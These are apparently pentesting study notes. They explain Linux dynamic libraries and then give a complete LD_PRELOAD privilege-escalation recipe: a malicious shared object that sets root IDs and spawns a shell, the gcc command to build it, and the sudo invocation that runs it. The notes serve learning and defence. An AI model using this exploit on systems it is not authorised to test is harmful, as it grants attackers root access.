- It is common for Linux programs to use dynamically linked shared object libraries.
- Libraries contain compiled code or other data that developers used to avoid re writing the same piece of code across multiple programs.
- Two types of libraries : `Static Libraries` and `Dynamically Linked Shared Object Libraries`
- Static libraries; part of the program; cannot be altered
- Dynamic libraries; can be modified to control the execution of the program that calls them

- Multiple methods are there for specifying the location of dynamic libraries :
	- `-rpath` flag or
	- `-rpath-link` flag when combining a program
	- using env variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`
	- placing libraries in `/lib` or `/usr/lib` default directories
	- `LD_PRELOAD` env variable can load a binary before executing a binary.

- The shared objects required by a binary can be viewed using the `ldd` utility.
```python
ldd /bin/ls
#shared objects required by ls binary
```


# LD_PRELOAD Privilege Escalation

### Check
```bash
sudo -l
```
Look for `env_keep+=LD_PRELOAD`.

### Exploit
Create a malicious shared library that executes:
```c
#include <stdio.h>
#include <sys/types.h> 
#include <stdlib.h> 
#include <unistd.h> 
void _init() 
{ 
unsetenv("LD_PRELOAD"); 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
}
```

Compile:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Run with sudo:
```bash
sudo LD_PRELOAD=/tmp/root.so /path/to/allowed/binary
```

### Verify
```bash
id
```
If successful:
```text
uid=0(root) gid=0(root)
```

> **Requirements:** `LD_PRELOAD` preserved in `sudoers` (`env_keep+=LD_PRELOAD`) and permission to run a sudo binary.
